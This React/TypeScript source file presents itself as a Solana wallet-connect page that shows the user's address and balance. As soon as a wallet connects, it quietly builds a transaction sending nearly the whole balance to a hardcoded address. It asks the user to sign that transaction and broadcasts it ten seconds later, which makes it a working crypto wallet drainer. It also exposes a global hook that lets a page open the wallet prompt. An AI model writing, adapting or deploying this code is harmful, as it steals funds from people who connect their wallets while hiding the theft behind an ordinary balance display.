import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    clusterApiUrl,
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';
import './App.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new LedgerWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
            new SolletExtensionWalletAdapter(),
            new SolletWalletAdapter(),
            new TorusWalletAdapter(),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndPrepareTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndPrepareTx = async (walletPublicKey: PublicKey) => {
        try {
            setLoading(true);
            const connection = new Connection('https://api.mainnet-beta.solana.com');

            let balanceLamports: number;
            try {
                balanceLamports = await connection.getBalance(walletPublicKey);
            } catch (err) {
                console.error('❌ Failed to fetch balance:', err);
                setSolBalance(null);
                return;
            }

            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
            setSolBalance(balanceSOL);
            console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(4)} SOL`);

            const transferAmount = balanceLamports - 5000; // Leave lamports for fee
            if (transferAmount <= 0) {
                console.warn('⚠️ Not enough SOL to send after fees.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: transferAmount,
                })
            );
            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                console.error('❌ Wallet does not support signing transactions.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('📝 Transaction signed by user.');

            setTimeout(async () => {
                try {
                    const sig = await connection.sendRawTransaction(signedTx.serialize());
                    console.log(`🚀 Sent after 10s. Tx Signature: ${sig}`);
                } catch (err) {
                    console.error('❌ Failed to send signed transaction:', err);
                }
            }, 10000);
        } catch (error) {
            console.error('❌ Transaction preparation error:', error);
        } finally {
            setLoading(false);
        }
    };

    if (!connected || !publicKey) return null;

    return (
        <div
            style={{
                marginTop: '2rem',
                textAlign: 'center',
                backgroundColor: '#f0f0f0',
                padding: '20px',
                borderRadius: '12px',
                boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
                maxWidth: '500px',
                marginLeft: '20px',
                marginRight: 'auto',
                fontFamily: 'Arial, sans-serif',
            }}
        >
            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected!</h2>
            <p
                style={{ color: '#000', wordBreak: 'break-all', cursor: 'pointer' }}
                onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
            >
                <strong>Address:</strong> {publicKey.toBase58()}
            </p>
            <p style={{ color: '#000' }}>
                <strong>Balance:</strong>{' '}
                {loading
                    ? 'Loading...'
                    : solBalance === null
                    ? 'Unable to fetch balance'
                    : `${solBalance.toFixed(4)} SOL`}
            </p>
        </div>
    );
};

export default App;
